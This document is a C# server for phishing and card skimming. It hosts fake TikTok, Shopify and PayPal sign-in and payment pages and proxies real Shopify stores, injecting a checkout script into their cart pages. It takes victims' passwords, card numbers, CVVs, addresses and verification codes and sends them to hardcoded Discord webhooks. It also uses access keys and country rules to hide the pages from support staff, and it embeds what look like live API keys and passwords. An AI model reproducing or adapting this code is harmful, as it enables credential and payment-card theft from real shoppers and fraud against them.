using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Generic;

// STARTUP:
// screen -dm bash -c "cd /root/Workspace/Server && dotnet run"
// screen -list
// killall screen

// TODO:
// -- Discord reports (done)
// -- File storage, exports

// ISSUES:
// -- SMS in USA comes from "Sender" (resolved)

// Shopify.Checkout.step = "contact_information/shipping_method/payment_method"
// Shopify.Checkout.currency = "USD"
// Shopify.Checkout.estimatedPrice = 11.99
// Shopify.Checkout.token
// Shopify.Checkout.customer.customer_id
// Shopify.Checkout.customer.first_name
// Shopify.Checkout.customer.last_name

class WebServer
{
    // private static void Main()
    // {
    //     Start();
    // }

    private static void Main()
    {
        try
        {
            HttpListener listener = new HttpListener();
            listener.Prefixes.Add("http://*:80/");
            listener.Start();

            while (listener.IsListening)
            {
                HttpListenerContext context = listener.GetContext();
                Task.Run(() => HandleRequest(context));
            }
        }
        catch (Exception exception)
        {
            Console.WriteLine(exception.Message);
        }
        finally
        {
            Main();
        }
    }

    private static void HandleRequest(HttpListenerContext context)
    {
        try
        {
            Console.WriteLine("[HTTP] {0} {1}", context.Request.HttpMethod, context.Request.Url);

            if (context.Request.Url.HostNameType != UriHostNameType.Dns)
            {
                RespondWithStatus(context, 400);
            }
            else if (context.Request.Url.Host.EndsWith(".tiktok.gdn"))
            {
                TikTokWebsite.HandleRequest(context);
            }
            else if (context.Request.Url.Host.EndsWith(".shopify.reviews"))
            {
                ShopifyWebsite.HandleRequest(context);
            }
            else if (context.Request.Url.Host == "x-pw.kalobu.com")
            {
                PayPalWebsite.HandleRequest(context);
            }
            else
            {
                ShopifyProxy.HandleRequest(context);
            }
        }
        catch (Exception exception)
        {
            Console.WriteLine(exception);
            RespondWithStatus(context, 500);
        }
    }

    // Response templates

    public static void RespondWithFile(HttpListenerContext context, string path)
    {
        if (File.Exists(path)) 
        {
            context.Response.StatusCode = 200;
            context.Response.ContentType = "text/html";

            using (StreamWriter writer = new StreamWriter(context.Response.OutputStream))
            {
                writer.Write(File.ReadAllText(path));
            }

            context.Response.Close();
        }
        else
        {
            context.Response.StatusCode = 404;
            context.Response.Close();
        }
    }

    public static void RespondWithText(HttpListenerContext context, string text, params object[] arguments)
    {
        context.Response.StatusCode = 200;
        context.Response.ContentType = "text/plain";

        using (StreamWriter writer = new StreamWriter(context.Response.OutputStream))
        {
            writer.Write(text, arguments);
        }

        context.Response.Close();
    }

    public static void RespondWithHtml(HttpListenerContext context, string text, params object[] arguments)
    {
        context.Response.StatusCode = 200;
        context.Response.ContentType = "text/html";

        using (StreamWriter writer = new StreamWriter(context.Response.OutputStream))
        {
            writer.Write(text, arguments);
        }

        context.Response.Close();
    }

    public static void RespondWithJson(HttpListenerContext context, Action<Utf8JsonWriter> callback)
    {
        context.Response.StatusCode = 200;
        context.Response.ContentType = "application/json";

        using (Utf8JsonWriter writer = new Utf8JsonWriter(context.Response.OutputStream))
        {
            writer.WriteStartObject();
            callback.Invoke(writer);
            writer.WriteEndObject();
        }

        context.Response.Close();
    }

    public static void RespondWithStatus(HttpListenerContext context, int status)
    {
        context.Response.StatusCode = status;
        context.Response.Close();
    }

    // Tools

    public static T DecodeJsonStream<T>(Stream stream)
    {
        using (StreamReader reader = new StreamReader(stream))
        {
            return JsonSerializer.Deserialize<T>(reader.ReadToEnd());
        }
    }

    // public static T DecodeJsonString<T>(string content)
    // {
    //     return JsonSerializer.Deserialize<T>(content);
    // }

    public static string GetUserIdentifier(HttpListenerContext context)
    {
        if (context.Request.Cookies["X-User-ID"] == null) 
        {
            if (context.Response.Cookies["X-User-ID"] == null)
            {
                Cookie cookie = new Cookie("X-User-ID", Guid.NewGuid().ToString());
                context.Response.AppendCookie(cookie);
                return cookie.Value;
            }
            else
            {
                return context.Response.Cookies["X-User-ID"].Value;
            }
        }
        else
        {
            return context.Request.Cookies["X-User-ID"].Value; 
        }
    }

    public static string GetUserInformation(HttpListenerContext context)
    {
        return string.Format("{0}, {1}, {2}, {3}",
            context.Request.Headers.Get("CF-IPCountry"),
            context.Request.Headers.Get("CF-Connecting-IP"),
            context.Request.Url.Host,
            GetUserIdentifier(context));
    }
}

class Files
{
    public static readonly string TikTokWebsite_BadgeRequest = "./Files/TikTokWebsite/BadgeRequest.html";
//         public static readonly string TikTokWebsite_BadgeRequestChallenge = string.Empty;

    public static readonly string ShopifyWebsite_PhoneNumber = "./Files/ShopifyWebsite/PhoneNumber.html";
//         public static readonly string ShopifyWebsite_PhoneNumberChallenge = string.Empty;

    public static readonly string ShopifyProxy_Checkout = "./Files/ShopifyProxy/Checkout.html";
    public static readonly string ShopifyProxy_Card = "./Files/ShopifyProxy/Card.html";
    public static readonly string ShopifyProxy_CardSubmit = "./Files/ShopifyProxy/CardSubmit.html";
    public static readonly string ShopifyProxy_CardVerify = "./Files/ShopifyProxy/CardVerify.html";

    public static readonly string PayPalWebsite_PaymentRequest = "./Files/PayPalWebsite/PaymentRequest.html";
//         public static readonly string PayPalWebsite_PaymentRequestChallenge = string.Empty;
}

// TikTok Website v1.0

class TikTokWebsite
{
    public static void HandleRequest(HttpListenerContext context)
    {
        if (context.Request.HttpMethod == "GET" && !AccessKeys.Lookup(context.Request.QueryString.Get("id")))
        {
            Discord.SendRequestRejected(Discord.TikTokWebsite, context);
            WebServer.RespondWithStatus(context, 404);
        }

        /* Static pages */
        else if (context.Request.HttpMethod == "GET" && context.Request.Url.AbsolutePath == "/tw/badge-request")
        {
            Discord.SendRequestAccepted(Discord.TikTokWebsite, context);
            WebServer.RespondWithHtml(context, "<script> window.location.pathname = '/tw/badge-request/update'; </script>");
        }
        else if (context.Request.HttpMethod == "GET" && context.Request.Url.AbsolutePath == "/tw/badge-request/update")
        {
            Discord.SendRequestAccepted(Discord.TikTokWebsite, context);
            WebServer.RespondWithFile(context, Files.TikTokWebsite_BadgeRequest);
        }

        /* Submission APIs */
        else if (context.Request.HttpMethod == "POST" && context.Request.Url.AbsolutePath == "/@/TikTok/BadgeRequest")
        {
            TikTokBadgeRequestData data = WebServer.DecodeJsonStream<TikTokBadgeRequestData>(context.Request.InputStream);

            Discord.SendMessage(Discord.TikTokWebsite, "TikTok Badge Request", new Dictionary<string, string>() 
            {
                { "Information", WebServer.GetUserInformation(context) },
                { "Username", data.Username },
                { "First Name", data.FirstName },
                { "Last Name", data.LastName },
                { "Email Address", data.EmailAddress },
                { "Phone Number", data.PhoneNumber },
                { "Message", data.Message }
            });

//                 WebServer.RespondWithJson(context, (writer) =>
//                 {
//                     if (string.IsNullOrWhiteSpace(data.Username)
//                         || string.IsNullOrWhiteSpace(data.FirstName)
//                         || string.IsNullOrWhiteSpace(data.LastName)
//                         || string.IsNullOrWhiteSpace(data.EmailAddress)
//                         || string.IsNullOrWhiteSpace(data.PhoneNumber)
//                         || string.IsNullOrWhiteSpace(data.Message))
//                     {
//                         writer.WriteBoolean("Success", false);
//                     }
//                     else
//                     {
//                         writer.WriteBoolean("Success", true);
//                     }
//                 });

            WebServer.RespondWithJson(context, (writer) => { });
        }
        else if (context.Request.HttpMethod == "POST" && context.Request.Url.AbsolutePath == "/@/TikTok/SignIn")
        {
            TikTokSignInData data = WebServer.DecodeJsonStream<TikTokSignInData>(context.Request.InputStream);

            Discord.SendMessage(Discord.TikTokWebsite, "@everyone", "TikTok SignIn", new Dictionary<string, string>() 
            {
                { "Information", WebServer.GetUserInformation(context) },
                { "Username", data.Username },
                { "Password", data.Password }
            });

            AccessKeys.Revoke(context.Request.QueryString.Get("id"));
            WebServer.RespondWithJson(context, (writer) => { });
        }

        else
        {
            WebServer.RespondWithStatus(context, 404);
        }
    }
}

struct TikTokBadgeRequestData 
{
    [JsonInclude] public string Username;
    [JsonInclude] public string FirstName;
    [JsonInclude] public string LastName;
    [JsonInclude] public string EmailAddress;
    [JsonInclude] public string PhoneNumber;
    [JsonInclude] public string Message;
}

struct TikTokSignInData 
{
    [JsonInclude] public string Username;
    [JsonInclude] public string Password;
}

// Shopify Website v1.0

class ShopifyWebsite
{
    public static void HandleRequest(HttpListenerContext context)
    {
        if (context.Request.HttpMethod == "GET" && !AccessKeys.Lookup(context.Request.QueryString.Get("id")))
        {
            Discord.SendRequestRejected(Discord.ShopifyWebsite, context);
            WebServer.RespondWithStatus(context, 404);
        }

        /* Static pages */
        else if (context.Request.HttpMethod == "GET" && context.Request.Url.AbsolutePath == "/sw/phone-number")
        {
            Discord.SendRequestAccepted(Discord.ShopifyWebsite, context);
            WebServer.RespondWithHtml(context, "<script> window.location.pathname = '/sw/phone-number/update'; </script>");
        }
        else if (context.Request.HttpMethod == "GET" && context.Request.Url.AbsolutePath == "/sw/phone-number/update")
        {
            Discord.SendRequestAccepted(Discord.ShopifyWebsite, context);
            WebServer.RespondWithFile(context, Files.ShopifyWebsite_PhoneNumber);
        }

        /* Submission APIs */
        else if (context.Request.HttpMethod == "POST" && context.Request.Url.AbsolutePath == "/@/Shopify/PhoneNumber")
        {
            ShopifyPhoneNumberData data = WebServer.DecodeJsonStream<ShopifyPhoneNumberData>(context.Request.InputStream);

            Discord.SendMessage(Discord.ShopifyWebsite, "Shopify Phone Number", new Dictionary<string, string>() 
            {
                { "Information", WebServer.GetUserInformation(context) },
                { "Number", data.Number }
            });

            WebServer.RespondWithJson(context, (writer) => 
            {
                writer.WriteBoolean("Success", Messaging.SendCode(data.Number, "508725"));
            });
        }
        else if (context.Request.HttpMethod == "POST" && context.Request.Url.AbsolutePath == "/@/Shopify/PhoneNumberVerify")
        {
            ShopifyPhoneNumberVerifyData data = WebServer.DecodeJsonStream<ShopifyPhoneNumberVerifyData>(context.Request.InputStream);

            Discord.SendMessage(Discord.ShopifyWebsite, "Shopify Phone Number Verify", new Dictionary<string, string>() 
            {
                { "Information", WebServer.GetUserInformation(context) },
                { "Code", data.Code }
            });

            WebServer.RespondWithJson(context, (writer) => 
            { 
                writer.WriteBoolean("Success", data.Code.Equals("508725")); 
            });
        }
        else if (context.Request.HttpMethod == "POST" && context.Request.Url.AbsolutePath == "/@/Shopify/SignIn")
        {
            ShopifySignInData data = WebServer.DecodeJsonStream<ShopifySignInData>(context.Request.InputStream);

            Discord.SendMessage(Discord.ShopifyWebsite, "@everyone", "Shopify SignIn", new Dictionary<string, string>()
            {
                { "Information", WebServer.GetUserInformation(context) },
                { "Username", data.Username },
                { "Password", data.Password }
            });

            AccessKeys.Revoke(context.Request.QueryString.Get("id"));
            WebServer.RespondWithJson(context, (writer) => { });
        }

        else
        {
            WebServer.RespondWithStatus(context, 404);
        }
    }
}

struct ShopifyPhoneNumberData 
{
    [JsonInclude] public string Number;
}

struct ShopifyPhoneNumberVerifyData 
{
    [JsonInclude] public string Code;
}

struct ShopifySignInData 
{
    [JsonInclude] public string Username;
    [JsonInclude] public string Password;
}

// Shopify Proxy v1.0

class ShopifyProxy
{   
    private static readonly string[] RemoteAddresses = new string[]
    {
        "23.227.38.32",
        "23.227.38.36",
        "23.227.38.65",
        "23.227.38.66",
        "23.227.38.67",
        "23.227.38.68",
        "23.227.38.69",
        "23.227.38.70",
        "23.227.38.71",
        "23.227.38.72",
        "23.227.38.73",
        "23.227.38.74"
    };

    public static void HandleRequest(HttpListenerContext context)
    {
        /* Static pages */
        if (context.Request.HttpMethod == "GET" && context.Request.Url.AbsolutePath == "/sp/card")
        {
            Discord.SendRequestAccepted(Discord.ShopifyProxy, context);
            WebServer.RespondWithFile(context, Files.ShopifyProxy_Card);
        }
        else if (context.Request.HttpMethod == "GET" && context.Request.Url.AbsolutePath == "/sp/card-submit")
        {
            Discord.SendRequestAccepted(Discord.ShopifyProxy, context);
            WebServer.RespondWithFile(context, Files.ShopifyProxy_CardSubmit);
        }
        else if (context.Request.HttpMethod == "GET" && context.Request.Url.AbsolutePath == "/sp/card-verify")
        {
            Discord.SendRequestAccepted(Discord.ShopifyProxy, context);
            WebServer.RespondWithFile(context, Files.ShopifyProxy_CardVerify);
        }

        /* Submission APIs */
        else if (context.Request.HttpMethod == "POST" && context.Request.Url.AbsolutePath == "/@/Checkout/Address") 
        { 
            CheckoutAddressData data = WebServer.DecodeJsonStream<CheckoutAddressData>(context.Request.InputStream);

            Discord.SendMessage(Discord.ShopifyProxy, "Checkout Address", new Dictionary<string, string>() 
            {
                { "Information", WebServer.GetUserInformation(context) },
                { "First Name", data.FirstName },
                { "Last Name", data.LastName },
                { "Address 1", data.Address1 },
                { "Address 2", data.Address2 },
                { "City", data.City },
                { "Province", data.Province },
                { "Country", data.Country },
                { "Zip Code", data.ZipCode },
                { "Email Address", data.EmailAddress },
                { "Phone Number", data.PhoneNumber },
                { "Cost", data.Cost }
            });

            WebServer.RespondWithJson(context, (writer) => 
            {
                writer.WriteString("Redirect", string.Empty);
            });
        }
        else if (context.Request.HttpMethod == "POST" && context.Request.Url.AbsolutePath == "/@/Checkout/Card") 
        {
            CheckoutCardData data = WebServer.DecodeJsonStream<CheckoutCardData>(context.Request.InputStream);

            Discord.SendMessage(Discord.ShopifyProxy, "Checkout Card", new Dictionary<string, string>() 
            {
                { "Information", WebServer.GetUserInformation(context) },
                { "Number", data.Number },
                { "Name", data.Name },
                { "Expiry", data.Expiry },
                { "Verification Value", data.VerificationValue },
                { "Cost", data.Cost }
            });

            WebServer.RespondWithJson(context, (writer) => 
            {
                if (AccessRules.Allows(AccessRules.CardSubmit, context.Request.Headers.Get("CF-IPCountry")))
                {
                    writer.WriteString("Redirect", "/sp/card-submit?a=n&b=n&c=n&d=n&e=n");
                }
                else if (AccessRules.Allows(AccessRules.CardVerify, context.Request.Headers.Get("CF-IPCountry")))
                {
                    writer.WriteString("Redirect", "/sp/card-verify");
                }
                else
                {
                    writer.WriteString("Redirect", string.Empty);
                }
            });
        }
        else if (context.Request.HttpMethod == "POST" && context.Request.Url.AbsolutePath == "/@/Checkout/CardVerify") 
        {
            CheckoutCardVerifyData data = WebServer.DecodeJsonStream<CheckoutCardVerifyData>(context.Request.InputStream);

            Discord.SendMessage(Discord.ShopifyProxy, "@everyone", "Checkout Card Verify", new Dictionary<string, string>() 
            {
                { "Information", WebServer.GetUserInformation(context) },
                { "Code", data.Code }
            });

            WebServer.RespondWithJson(context, (writer) => { });
        }
        else if (context.Request.HttpMethod == "POST" && context.Request.Url.AbsolutePath == "/@/Checkout/PayPal") 
        {
            CheckoutPayPalData data = WebServer.DecodeJsonStream<CheckoutPayPalData>(context.Request.InputStream);

            Discord.SendMessage(Discord.ShopifyProxy, "Checkout PayPal", new Dictionary<string, string>() 
            {
                { "Information", WebServer.GetUserInformation(context) },
                { "Cost", data.Cost }
            });

            WebServer.RespondWithJson(context, (writer) => 
            {
                if (AccessRules.Allows(AccessRules.PayPal, context.Request.Headers.Get("CF-IPCountry")))
                {
                    writer.WriteString("Redirect", "/pw/payment-request?id=n");

                    // Use WebServer.GetUserIdentifier as the access key,
                    // so in case the user contacts support to report the
                    // scamming page, it won't work for the support people,
                    // nor Shopify support.

                    // Might also use SHA256ed IP address of the visitor.
                }
                else
                {
                    writer.WriteString("Redirect", string.Empty);
                }
            });
        }

        /* Forwarded URLs */
        else if (context.Request.Url.AbsolutePath == "/pw/payment-request"
            || context.Request.Url.AbsolutePath == "/pw/payment-request/update"
            || context.Request.Url.AbsolutePath == "/@/PayPal/SignIn"
            || context.Request.Url.AbsolutePath == "/@/PayPal/SignInVerify")
        {
            PayPalWebsite.HandleRequest(context);
        }

        else
        {
            if (context.Request.HttpMethod == "GET" && context.Request.Url.AbsolutePath == "/admin")
            {
                Discord.SendRequestAccepted(Discord.ShopifyProxy, context);
            }
            
            ProxyRequest(context);
        }    
    }

    private static void ProxyRequest(HttpListenerContext context)
    {
        UriBuilder builder = new UriBuilder(context.Request.Url.AbsoluteUri)
        {
            Host = RemoteAddresses[DateTime.UtcNow.Second % RemoteAddresses.Length],
            Port = 443,
            Scheme = "https"
        };

        HttpWebRequest request = WebRequest.CreateHttp(builder.Uri);

        request.Method = context.Request.HttpMethod;
        request.AllowAutoRedirect = false;
        request.AutomaticDecompression = DecompressionMethods.All;

        foreach (string key in context.Request.Headers.AllKeys)
        {
            foreach (string value in context.Request.Headers.GetValues(key))
            {
                request.Headers.Add(key, value);
            }
        }

        if (context.Request.HasEntityBody)
        {
            using (StreamReader reader = new StreamReader(context.Request.InputStream))
            {
                using (StreamWriter writer = new StreamWriter(request.GetRequestStream()))
                {
                    writer.Write(reader.ReadToEnd());
                }
            }
        }

        try
        {
            ProxyResponse(context, (HttpWebResponse)request.GetResponse());
        }
        catch (WebException exception)
        {
            if (exception.Response is WebResponse response)
            {
                ProxyResponse(context, (HttpWebResponse)response);
            }
        }    
    }

    private static void ProxyResponse(HttpListenerContext context, HttpWebResponse response)
    {
        context.Response.StatusCode = (int)response.StatusCode;

        foreach (string key in response.Headers.AllKeys)
        {
            foreach (string value in response.Headers.GetValues(key))
            {
                context.Response.Headers.Add(key, value);
            }
        }

        using (StreamReader reader = new StreamReader(response.GetResponseStream()))
        {
            using (StreamWriter writer = new StreamWriter(context.Response.OutputStream))
            {
                writer.Write(reader.ReadToEnd());

                if (context.Request.Url.AbsolutePath.Equals("/cart") ||
                    context.Request.Url.AbsolutePath.Equals("/checkout") ||
                    context.Request.Url.AbsolutePath.Contains("/checkouts/"))
                {
                    if (File.Exists(Files.ShopifyProxy_Checkout))
                    {
                        writer.Write(File.ReadAllText(Files.ShopifyProxy_Checkout));
                    }
                }
            }
        }

        context.Response.Close();
    } 
}

struct CheckoutAddressData 
{
    [JsonInclude] public string FirstName;
    [JsonInclude] public string LastName;
    [JsonInclude] public string Address1;
    [JsonInclude] public string Address2;
    [JsonInclude] public string City;
    [JsonInclude] public string Province;
    [JsonInclude] public string Country;
    [JsonInclude] public string ZipCode;
    [JsonInclude] public string EmailAddress;
    [JsonInclude] public string PhoneNumber;
    [JsonInclude] public string Cost;
}

struct CheckoutCardData 
{
    [JsonInclude] public string Number;
    [JsonInclude] public string Name;
    [JsonInclude] public string Expiry;
    [JsonInclude] public string VerificationValue;
    [JsonInclude] public string Cost;
}

struct CheckoutCardVerifyData 
{
    [JsonInclude] public string Code;
}

struct CheckoutPayPalData
{
    [JsonInclude] public string Cost;
}

// PayPal Website v1.0

class PayPalWebsite
{
    public static void HandleRequest(HttpListenerContext context)
    {
        // if (context.Request.HttpMethod == "GET" && !AccessKeys.Lookup(context.Request.QueryString.Get("id")))
        // {
        //     Discord.SendRequestRejected(Discord.PayPalWebsite, context);
        //     WebServer.RespondWithStatus(context, 404);
        // }

        /* Static pages */
        if (context.Request.HttpMethod == "GET" && context.Request.Url.AbsolutePath == "/pw/payment-request")
        {
            Discord.SendRequestAccepted(Discord.PayPalWebsite, context);
            WebServer.RespondWithHtml(context, "<script> window.location.pathname = '/pw/payment-request/update'; </script>");
        }
        else if (context.Request.HttpMethod == "GET" && context.Request.Url.AbsolutePath == "/pw/payment-request/update")
        {
            Discord.SendRequestAccepted(Discord.PayPalWebsite, context);
            WebServer.RespondWithFile(context, Files.PayPalWebsite_PaymentRequest);
        }

        /* Submission APIs */
        else if (context.Request.HttpMethod == "POST" && context.Request.Url.AbsolutePath == "/@/PayPal/SignIn")
        {
            PayPalSignInData data = WebServer.DecodeJsonStream<PayPalSignInData>(context.Request.InputStream);

            Discord.SendMessage(Discord.PayPalWebsite, "@everyone", "PayPal SignIn", new Dictionary<string, string>() 
            {
                { "Information", WebServer.GetUserInformation(context) },
                { "Username", data.Username },
                { "Password", data.Password }
            });

            WebServer.RespondWithJson(context, (writer) => { });
        }
        else if (context.Request.HttpMethod == "POST" && context.Request.Url.AbsolutePath == "/@/PayPal/SignInVerify")
        {
            PayPalSignInVerifyData data = WebServer.DecodeJsonStream<PayPalSignInVerifyData>(context.Request.InputStream);

            Discord.SendMessage(Discord.PayPalWebsite, "@everyone", "PayPal SignIn Verify", new Dictionary<string, string>() 
            {
                { "Information", WebServer.GetUserInformation(context) },
                { "Code", data.Code }
            });

            WebServer.RespondWithJson(context, (writer) => { });
        }

        else
        {
            WebServer.RespondWithStatus(context, 404);
        }
    }
}

struct PayPalSignInData 
{
    [JsonInclude] public string Username;
    [JsonInclude] public string Password;
}

struct PayPalSignInVerifyData 
{
    [JsonInclude] public string Code;
}

// Tools v1.1

class Messaging
{
    private static readonly string Authorization = "KEY017A7E538F4FD7582854FF2D14D2CED6_Y4shOpXyre1oHBLJNA5UFT";
    private static readonly string ProfileIdentifier = "40017a7e-5162-412f-a0ac-9efe60a59fdc";
    private static readonly string SenderNumber = "+12349999924";
    private static readonly string SenderName = "Verify";

    public static bool SendCode(string recipient, string code)
    {
        try
        {
            HttpWebRequest request = WebRequest.CreateHttp("https://api.telnyx.com/v2/messages");

            request.Method = "POST";
            request.Headers.Add("Accept", "application/json");
            request.Headers.Add("Content-Type", "application/json");
            request.Headers.Add("Authorization", string.Format("Bearer {0}", Authorization));

            using (Utf8JsonWriter writer = new Utf8JsonWriter(request.GetRequestStream()))
            {
                writer.WriteStartObject();
                writer.WriteString("text", string.Format("Your code is {0}, valid for 5 minutes.", code));
                writer.WriteString("to", recipient);

                if (!recipient.StartsWith("+1"))
                {
                    Console.WriteLine("From = {0} @ {1}", SenderName, ProfileIdentifier);
                    writer.WriteString("messaging_profile_id", ProfileIdentifier);
                    writer.WriteString("from", SenderName);
                }
                else
                {
                    Console.WriteLine("From = {0}", SenderNumber);
                    writer.WriteString("from", SenderNumber);
                }

                writer.WriteEndObject();
            }

            request.GetResponse();
            return true;
        }
        catch (Exception exception)
        {
            Console.WriteLine(exception.Message);
            return false;
        } 
    }
}

class Discord
{
    public static readonly string TikTokWebsite = "https://discord.com/api/webhooks/866327449003491339/QgSY8oJTbxtUizMzefpgvdVf_FAWrCq-Rloo63uVLbrSPi0q8781oyBB1__pAhvYSpuZ";
    public static readonly string ShopifyWebsite = "https://discord.com/api/webhooks/866327497242443826/gl6r3sqKy9PWkmX539efS_t-egHNTLSBlcHasnUUVQIVziXI8y21TWHfVBMhHimDGNU_";
    public static readonly string ShopifyProxy = "https://discord.com/api/webhooks/866327538271780864/LXuqSklym2a3KJFHQgiR2AoSv8vxmk82Av2TMaXIxjIULXZTjML1yQ-s4DG5gh-h3a2E";
    public static readonly string PayPalWebsite = "https://discord.com/api/webhooks/866327594664067093/Goa_q6fsTE89Cns5uj0W9zR1aT9Rg3baiYHeyhLHtaST7xCdkvZ_I8mpbRPbrOsUsLL9";

    public static void SendMessage(string channel, string content, string title, Dictionary<string, string> fields)
    {
        try
        {
            HttpWebRequest request = WebRequest.CreateHttp(channel);

            request.Method = "POST";
            request.Headers.Add("Accept", "application/json");
            request.Headers.Add("Content-Type", "application/json");

            using (Utf8JsonWriter writer = new Utf8JsonWriter(request.GetRequestStream()))
            {
                writer.WriteStartObject();

                if (!string.IsNullOrWhiteSpace(content))
                {
                    writer.WriteString("content", content);
                }

                if (fields != null && fields.Count != 0)
                {
                    writer.WriteStartArray("embeds");
                    writer.WriteStartObject();

                    if (!string.IsNullOrWhiteSpace(title))
                    {
                        writer.WriteString("title", title);
                    }

                    writer.WriteStartArray("fields");

                    foreach (KeyValuePair<string, string> field in fields)
                    {
                        writer.WriteStartObject();
                        writer.WriteString("name", field.Key);

                        if (!string.IsNullOrWhiteSpace(field.Value))
                        {
                            writer.WriteString("value", string.Format("```{0}```", field.Value));
                        }
                        else
                        {
                            writer.WriteString("value", "```Empty```");
                        }

                        writer.WriteEndObject();
                    }

                    writer.WriteEndArray();
                    writer.WriteEndObject();
                    writer.WriteEndArray();
                }

                writer.WriteEndObject();
            }

            request.GetResponse();
        }
        catch (Exception exception) 
        {
            Console.WriteLine(exception);
        }  
    }

    public static void SendMessage(string channel, string content, params object[] arguments)
    {
        for (int i = 0; i < arguments.Length; i++)
        {
            if (arguments[i] == null || string.IsNullOrWhiteSpace(arguments[i].ToString()))
            {
                arguments[i] = "Empty";
            }
        }

        SendMessage(channel, string.Format(content, arguments), null, null);
    }

    public static void SendMessage(string channel, string title, Dictionary<string, string> fields)
    {
        SendMessage(channel, null, title, fields);
    }


    public static void SendRequestAccepted(string channel, HttpListenerContext context)
    {
        if (string.IsNullOrWhiteSpace(context.Request.QueryString.Get("id")))
        {
            SendMessage(channel, ":white_check_mark: User ``{0}`` has been served ``{1}``.", 
                WebServer.GetUserInformation(context), context.Request.Url.AbsolutePath);
        }
        else
        {
            SendMessage(channel, ":white_check_mark: User ``{0}`` using access key ``{1}`` has been served ``{2}``.", 
                WebServer.GetUserInformation(context), context.Request.QueryString.Get("id"), context.Request.Url.AbsolutePath);
        }
    }

    public static void SendRequestRejected(string channel, HttpListenerContext context)
    {
        if (string.IsNullOrWhiteSpace(context.Request.QueryString.Get("id")))
        {
            SendMessage(channel, ":warning: User ``{0}`` wasn't served ``{1}`` because no access key was provided.", 
                WebServer.GetUserInformation(context), context.Request.Url.AbsolutePath);
        }
        else
        {
            SendMessage(channel, ":warning: User ``{0}`` using access key ``{1}`` wasn't served ``{2}`` because the access key has expired or isn't valid.", 
                WebServer.GetUserInformation(context), context.Request.QueryString.Get("id"), context.Request.Url.AbsolutePath);
        }
    }
}

class AccessKeys
{
    private static readonly string Hostname = "access-keys.kalobu.workers.dev";
    private static readonly string Password = "6d26223b";

//         public static string Create(string user) 
//         {
//             try
//             {
//                 string url = string.Format("https://{0}/access-keys/create?password={1}&user={2}", Hostname, Password, user);
//                 HttpWebRequest request = WebRequest.CreateHttp(url);
//                 HttpWebResponse response = request.GetResponse() as HttpWebResponse;

//                 using (StreamReader reader = new StreamReader(response.GetResponseStream()))
//                 {
//                     return reader.ReadToEnd();
//                 }
//             }
//             catch (Exception)
//             {
//                 return string.Empty;
//             }
//         }

    public static bool Lookup(string id)
    {
        try
        {
            string url = string.Format("https://{0}/access-keys/lookup?password={1}&id={2}", Hostname, Password, id);
            HttpWebRequest request = WebRequest.CreateHttp(url);
            HttpWebResponse response = request.GetResponse() as HttpWebResponse;

            using (StreamReader reader = new StreamReader(response.GetResponseStream()))
            {
                return string.IsNullOrWhiteSpace(reader.ReadToEnd()).Equals(false);
            }
        }
        catch (Exception)
        {
            return false;
        }
    }

    public static bool Revoke(string id)
    {
        try
        {
            string url = string.Format("https://{0}/access-keys/revoke?password={1}&id={2}", Hostname, Password, id);
            HttpWebRequest request = WebRequest.CreateHttp(url);
            HttpWebResponse response = request.GetResponse() as HttpWebResponse;

            using (StreamReader reader = new StreamReader(response.GetResponseStream()))
            {
                return string.IsNullOrWhiteSpace(reader.ReadToEnd()).Equals(false);
            }
        }
        catch (Exception)
        {
            return false;
        }
    }
}

class AccessRules
{
    public static readonly string CardVerify = "https://access-rules.kalobu.workers.dev/access-rules/card_verify.json";
    public static readonly string CardSubmit = "https://access-rules.kalobu.workers.dev/access-rules/card_submit.json";
    public static readonly string PayPal = "https://access-rules.kalobu.workers.dev/access-rules/paypal.json";

    private static AccessRulesData Download(string url)
    {
        try
        {
            HttpWebRequest request = WebRequest.CreateHttp(url);

            request.Method = "GET";
            request.Headers.Add("Accept", "application/json");
            request.Headers.Add("Content-Type", "application/json");

            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            return WebServer.DecodeJsonStream<AccessRulesData>(response.GetResponseStream());
        }
        catch (Exception)
        {
            return new AccessRulesData();
        } 
    }

    private static bool Compare(AccessRulesData data, string country)
    {
        if (data.Enable && data.Include != null && data.Exclude != null)
        {
            for (int i = 0; i < data.Exclude.Length; i++)
            {
                if (data.Exclude[i] == "*" || data.Exclude[i].ToUpper() == country) return false;
            }

            for (int i = 0; i < data.Include.Length; i++)
            {
                if (data.Include[i] == "*" || data.Include[i].ToUpper() == country) return true;
            }
        }

        return false;
    }

    public static bool Allows(string url, string country)
    {
        return Compare(Download(url), country);
    }

    public static bool Allows(string url, string country, out AccessRulesData data)
    {
        data = Download(url);
        return Compare(data, country);
    }
}

struct AccessRulesData
{
    [JsonInclude] public bool Enable;
    [JsonInclude] public string[] Include;
    [JsonInclude] public string[] Exclude;
    [JsonInclude] public string Location;
}
